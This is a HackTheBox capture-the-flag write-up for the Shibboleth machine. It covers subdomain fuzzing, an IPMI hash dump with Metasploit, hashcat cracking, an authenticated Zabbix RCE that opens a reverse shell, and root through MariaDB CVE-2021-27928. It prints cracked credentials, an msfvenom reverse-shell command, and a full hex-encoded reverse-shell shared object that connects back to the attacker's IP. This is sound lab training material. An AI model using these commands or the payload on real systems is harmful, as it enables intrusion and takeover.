## Reconnaissance

### nmap 

![](./IMG/0.png)

### Web Service

![](./IMG/1.png)

###  Gobuster Path BruteForce

![](./IMG/2.png)

### WebService 2

> Following the result to check web service in browser 

![](./IMG/3.png)

![](./IMG/4.png)

![](./IMG/5.png)


![](./IMG/6.png)

![](./IMG/7.png)

### WFUZZ Scan subdomain 

```
wfuzz -w http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-topmilion-5000.txt
```

![](./IMG/9.png)

> Filter word size 

```
wfuzz -w http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-topmilion-5000.txt -hw 26
```

![](./IMG/8.png)

### Access subdomain 

> All the subdomain response the same page - Login page 

 ![](./IMG/10.png)

> Using gobuster to enumerate the subdomain 

![](./IMG/11.png)

> Try to access those results from gobuster 
> Most of them are forbidden, so I must need to login first

![](./IMG/12.png)

![](./IMG/13.png)

> Only find some path response content

![](./IMG/17.png)

> Try to login with common credential and the default credential 

```
Admin / zabbix
```

![](./IMG/16.png)
![](./IMG/14.png)

![](./IMG/15.png)

> So far, it's not able to find a way to exploit.
> I scan udp by nmap

![](./IMG/18.png)
![](./IMG/19.png)

> When I scan the detail of this udp port
> The following information - ipmi version 2

![](./IMG/20.png)

> Find port 623 open, research it.
> Research this IPMI-V2 

- [(HackTricks)Port 623](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)

![](./IMG/21.png)

![](./IMG/22.png)
## Exploit 

> Follow the instruction in HackTricks
> Start metasploit, using  ipmi_dumphashes

![](./IMG/23.png)

> Check options and set the necessary information 

```
set OUTPUT_JHON_FILE /home/kali/Desktop/HTB/lab/Shibboleth/ipmi.txt
set RHOSTS 10.129.230.172
set OUTPUT_HASHCAT_FILE /home/kali/Desktop/HTB/lab/Shibboleth/hashcat.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
```

![](./IMG/24.png)

> After executing, I will get the hash value for Administrator
> I generate a hash file for cracking

![](./IMG/28.png)

> Try to crack it by hashcat.
> I need to know what's the mode I can use.
> I check the ipmi.txt which generates by dumphash and search the following keyword in hashcat help

![](./IMG/26.png)

```
ipmi 
rakp
IPMI
RAKP
```

![](./IMG/27.png)
> So I start to crack it by following command 

```
hashcat -m 7300 hashcat.txt  /usr/share/wordlists/rockyou.txt
```
> Find result.

```
Administrator / ilovepumkinpie1
```

![](./IMG/25.png)

> Using this credential, I cam login to ZABBIX

![](./IMG/29.png)

> Find the version of  ZABBIX and record it

```
Zabbix 5.0.17
```

![](./IMG/30.png)
> Search exploit code
> Here is a RCE exploit code which authenticated user is necessary


![](./IMG/31.png)
> So I use this code to get reverse shell.

```
python exp.py http://monitor.shibboleth.htb Administrator ilovepumkinpie1 10.10.17.145 1339
```

![](./IMG/32.png)

> Check  current user

![](./IMG/46.png)
> Try to confirm user flag, but permission not allowed

![](./IMG/34.png)

> Check other possible user

```
cat /etc/passwd
```

![](./IMG/35.png)

> Try to change user to ipmi-svc with password I found.

![](./IMG/33.png)

> Check user flag

![](./IMG/36.png)

## Privilege Escalation 

> Check network 

![](./IMG/37.png)

> Check OS information 

![](./IMG/38.png)

> Upload linpeas and execute it 

![](./IMG/39.png)

![](./IMG/40.png)

![](./IMG/41.png)

> Find the following information 

```
TLSPKSFILE
peeesskay.psk
/etc/zabbix
/usr/lib/zabbix
/usr/share/zabbix
```

![](./IMG/42.png)

> enumerate those file.
> Find DB information in /etc/zabbix

![](./IMG/43.png)

![](./IMG/44.png)
> DBUser and DBPassword

```
zabbix / bloooarskybluh
```

![](./IMG/45.png)

> Connect to MariaDB  
> Start to enumerate the DB

```
mysql -h localhost -u zabbix -p
```

![](./IMG/47.png)
![](./IMG/48.png)

![](./IMG/49.png)

> Find  user table with some credential
> But those are not useful for get root permission

![](./IMG/50.png)
> I also check the MariaDB version 

```
select @@version;
```

```
10.3.25-MariaDB-0ubuntu0.20.04.1
```

![](./IMG/51.png)

> Search exploit based on this version 

- [(GITHUB)CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)

> Follow the instruction in GITHUB.

1. Create exploit payload by msfvenom
   ```
   msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.17.145 lport=1330 -f elf-so -o pe.so
   ```
![](./IMG/52.png)
2.  Transfer it to target host

![](./IMG/53.png)

3. Login to MariaDB and do the following
```
SELECT UNHEX('7f454c4602010100000000000000000003003e000100000092010000000000004000000000000000b000000000000000000000004000380002004000020001000100000007000000000000000000000000000000000000000000000000000000dc0100000000000026020000000000000010000000000000020000000700000030010000000000003001000000000000300100000000000060000000000000006000000000000000001000000000000001000000060000000000000000000000300100000000000030010000000000006000000000000000000000000000000008000000000000000700000000000000000000000300000000000000000000009001000000000000900100000000000002000000000000000000000000000000000000000000000000000000000000000c00000000000000920100000000000005000000000000009001000000000000060000000000000090010000000000000a0000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000000006a2958996a025f6a015e0f05489748b9020005320a0a1191514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05') into dumpfile '/tmp/pe.so';

```
![](./IMG/54.png)

4. Then SET GLOBAL
```
SET GLOBAL wsrep_provider='/tmp/pe.so';
```

![](./IMG/55.png)

> Check nc listener 

![](./IMG/56.png)
> Check current user 

![](./IMG/57.png)

> Check root flag

![](./IMG/58.png)

## Reference 

- [Writeup](https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html#crack-ipmi-hash)
- [(ExploitDB)Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50816)
- [ZABBIX Guidance Document](https://www.zabbix.com/documentation/current/en/manual/quickstart/login)
- [(HackTrick) UDP Port 623](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)
- [(GITHUB)ipmiPwner](https://github.com/c0rnf13ld/ipmiPwner)
- [MariaDB Version Check](https://database.guide/6-ways-to-check-your-mariadb-version/)
- [A Penetration Tester's Guide to IPMI and BMCs](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)
- [(GITHUB)CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)

###### tags: `HackTheBox`